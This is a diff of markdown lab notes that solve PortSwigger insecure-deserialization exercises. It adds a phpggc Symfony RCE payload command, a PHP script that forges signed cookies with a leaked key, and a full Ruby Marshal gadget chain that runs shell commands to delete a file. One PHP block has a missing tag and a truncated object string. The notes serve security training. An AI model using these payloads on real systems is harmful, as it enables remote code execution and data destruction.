@@ -12,6 +12,8 @@ tags:
 
 ## Modifying serialized objects
 
+APPRENTICE [Modifying serialized objects](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)
+
 ### Enunciation
 
 This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user `carlos`.
@@ -40,6 +42,8 @@ You can log in to your own account using the following credentials: `wiener:pete
 
 
 ## Modifying serialized data types
+
+PRACTITIONER [Modifying serialized data types](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)
 
 ### Enunciation
 
@@ -99,6 +103,8 @@ What we did:
 
 ## Using application functionality to exploit insecure deserialization
 
+PRACTITIONER [Using application functionality to exploit insecure deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization)
+
 ### Enunciation
 
 This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the `morale.txt` file from Carlos's home directory.
@@ -133,6 +139,8 @@ Exploit would be changing the path to a file that we want to remove and update t
 
 
 ## Arbitrary object injection in PHP
+
+PRACTITIONER [Arbitrary object injection in PHP](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)
 
 ### Enunciation
 
@@ -186,6 +194,8 @@ Run the request!
 
 ## Exploiting Java deserialization with Apache Commons
 
+PRACTITIONER [Exploiting Java deserialization with Apache Commons](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)
+
 ### Enunciation
 
 This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.
@@ -229,8 +239,6 @@ Now, we copy paste that value in the Cookie session, then we select it and with 
 
 ![Insecure deserialization](../img/indes_15.png)
 
-
-
 ```
 # Burp solution
 
@@ -248,48 +256,242 @@ Now, we copy paste that value in the Cookie session, then we select it and with 
 ```
 
 
+## Exploiting PHP deserialization with a pre-built gadget chain
 
-
-## J
-
-### Enunciation
-
-T
-
-### Solution
-
-
-![Insecure deserialization](../img/indes_.png)
-
-
-```
-# Burp solution
-
-
-```
-
-
-
-
-## J
+PRACTITIONER [Exploiting PHP deserialization with a pre-built gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)
 
 ### Enunciation
 
-T
+This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's [insecure deserialization](https://portswigger.net/web-security/deserialization) using pre-built gadget chains.
+
+To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the `morale.txt` file from Carlos's home directory.
+
+You can log in to your own account using the following credentials: `wiener:peter`
 
 ### Solution
 
+**1.** The cookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash.
 
-![Insecure deserialization](../img/indes_.png)
+![Insecure deserialization](../img/indes_19.png)
 
+**2.** Changing cookie to a fake value will expose the Sympfony 4.3.6 php library.
+
+![Insecure deserialization](../img/indes_16.png)
+
+**3.** Also have a look at the secret_key revealed in the commented url. 
+
+![Insecure deserialization](../img/indes_17.png)
+
+**4.** phpgcc has a gadget chain for that library
+
+![Insecure deserialization](../img/indes_18.png)
+
+**5.** Create your payload with:
+
+```
+./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0 > test.txt
+```
+
+![Insecure deserialization](../img/indes_20.png)
+
+**6.** Construct a valid cookie containing this malicious object and sign it correctly using the secret key. Using this template:
+
+```php
+<?php 
+$object = "OBJECT-GENERATED-BY-PHPGGC"; 
+$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP"; 
+$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}'); 
+echo $cookie;
+```
+
+Generate a file lab.php customizing the script. Use the $secretKey obtained in step 3. Use the payload generated in step 5 for the $object.
+
+```php
+?php
+$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRh>
+$secretKey = "cvb2w284adozzw3m2wgbhmxn7ezi9s4v";
+$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
+echo $cookie;
+```
+
+**7.** Add permissions and run it:
+
+```
+chmod +x lab.php
+php lab.php
+```
+
+
+![Insecure deserialization](../img/indes_21.png)
+
+**8.** Place the generated cookie in the Coodie session in the Repeater and Send the request.
+
+![Insecure deserialization](../img/indes_22.png)
 
 ```
 # Burp solution
-
+1. Log in and send a request containing your session cookie to Burp Repeater. Highlight the cookie and look at the **Inspector** panel.
+2. Notice that the cookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash.
+3. Copy the decoded cookie from the **Inspector** and paste it into Decoder.
+4. In Decoder, highlight the token and then select **Decode as > Base64**. Notice that the token is actually a serialized PHP object.
+5. In Burp Repeater, observe that if you try sending a request with a modified cookie, an exception is raised because the digital signature no longer matches. However, you should notice that:
+    - A developer comment discloses the location of a debug file at `/cgi-bin/phpinfo.php`.
+    - The error message reveals that the website is using the Symfony 4.3.6 framework.
+6. Request the `/cgi-bin/phpinfo.php` file in Burp Repeater and observe that it leaks some key information about the website, including the `SECRET_KEY` environment variable. Save this key; you'll need it to sign your exploit later.
+7. Download the "PHPGGC" tool and execute the following command:
+    
+    `./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64`
+    
+    This will generate a Base64-encoded serialized object that exploits an RCE gadget chain in Symfony to delete Carlos's `morale.txt` file.
+    
+8. You now need to construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained earlier. You can use the following PHP script to do this. Before running the script, you just need to make the following changes:
+    
+    - Assign the object you generated in PHPGGC to the `$object` variable.
+    - Assign the secret key that you copied from the `phpinfo.php` file to the `$secretKey` variable.
+    
+    `<?php $object = "OBJECT-GENERATED-BY-PHPGGC"; $secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP"; $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}'); echo $cookie;`
+    
+    This will output a valid, signed cookie to the console.
+    
+9. In Burp Repeater, replace your session cookie with the malicious one you just created, then send the request to solve the lab.
 
 ```
 
 
+## Exploiting Ruby deserialization using a documented gadget chain
+
+PRACTITIONER [Exploiting Ruby deserialization using a documented gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain)
+
+### Enunciation
+
+ This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.
+
+To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory.
+
+You can log in to your own account using the following credentials: wiener:peter 
+
+### Solution
+
+**1.** Provoke an error message to disclose the library performing deserialization in the cookie session:
+
+![Insecure deserialization](../img/indes_23.png)
+
+**2.** Find a documented vulnerability for that library at [https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html)
+
+
+**3.** Copy the original script:
+
+```
+# Autoload the required classes
+Gem::SpecFetcher
+Gem::Installer
+
+# prevent the payload from running when we Marshal.dump it
+module Gem
+  class Requirement
+    def marshal_dump
+      [@requirements]
+    end
+  end
+end
+
+wa1 = Net::WriteAdapter.new(Kernel, :system)
+
+rs = Gem::RequestSet.allocate
+rs.instance_variable_set('@sets', wa1)
+rs.instance_variable_set('@git_set', "id")
+
+wa2 = Net::WriteAdapter.new(rs, :resolve)
+
+i = Gem::Package::TarReader::Entry.allocate
+i.instance_variable_set('@read', 0)
+i.instance_variable_set('@header', "aaa")
+
+
+n = Net::BufferedIO.allocate
+n.instance_variable_set('@io', i)
+n.instance_variable_set('@debug_output', wa2)
+
+t = Gem::Package::TarReader.allocate
+t.instance_variable_set('@io', n)
+
+r = Gem::Requirement.allocate
+r.instance_variable_set('@requirements', t)
+
+payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
+puts payload.inspect
+puts Marshal.load(payload)
+```
+
+**4.** And modify it:
+
+```
+# Autoload the required classes
+Gem::SpecFetcher
+Gem::Installer
+
+# prevent the payload from running when we Marshal.dump it
+module Gem
+  class Requirement
+    def marshal_dump
+      [@requirements]
+    end
+  end
+end
+
+wa1 = Net::WriteAdapter.new(Kernel, :system)
+
+rs = Gem::RequestSet.allocate
+rs.instance_variable_set('@sets', wa1)
+rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")
+
+wa2 = Net::WriteAdapter.new(rs, :resolve)
+
+i = Gem::Package::TarReader::Entry.allocate
+i.instance_variable_set('@read', 0)
+i.instance_variable_set('@header', "aaa")
+
+
+n = Net::BufferedIO.allocate
+n.instance_variable_set('@io', i)
+n.instance_variable_set('@debug_output', wa2)
+
+t = Gem::Package::TarReader.allocate
+t.instance_variable_set('@io', n)
+
+r = Gem::Requirement.allocate
+r.instance_variable_set('@requirements', t)
+
+payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
+puts Base64.encode64(payload)
+```
+
+Changes made: 
+
+- Last two lines to puts Base64.encode64(payload)
+- User line `rs.instance_variable_set('@git_set', "id")` to inject the payload `rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")`. 
+
+**5.** Run it. You can use [https://onecompiler.com/ruby/](https://onecompiler.com/ruby/)
+
+
+![Insecure deserialization](../img/indes_24.png)
+
+**6.** Paste the generated payload into the session cookie in the repeater and have sent the request.
+
+![Insecure deserialization](../img/indes_25.png)
+
+```
+# Burp solution
+1. Log in to your own account and notice that the session cookie contains a serialized ("marshaled") Ruby object. Send a request containing this session cookie to Burp Repeater.
+2. Browse the web to find the `Universal Deserialisation Gadget for Ruby 2.x-3.x` by `vakzz` on `devcraft.io`. Copy the final script for generating the payload.
+3. Modify the script as follows:
+    - Change the command that should be executed from `id` to `rm /home/carlos/morale.txt`.
+    - Replace the final two lines with `puts Base64.encode64(payload)`. This ensures that the payload is output in the correct format for you to use for the lab.
+4. Run the script and copy the resulting Base64-encoded object.
+5. In Burp Repeater, replace your session cookie with the malicious one that you just created, then URL encode it.
+6. Send the request to solve the lab.
+
+```
 
 
 ## J
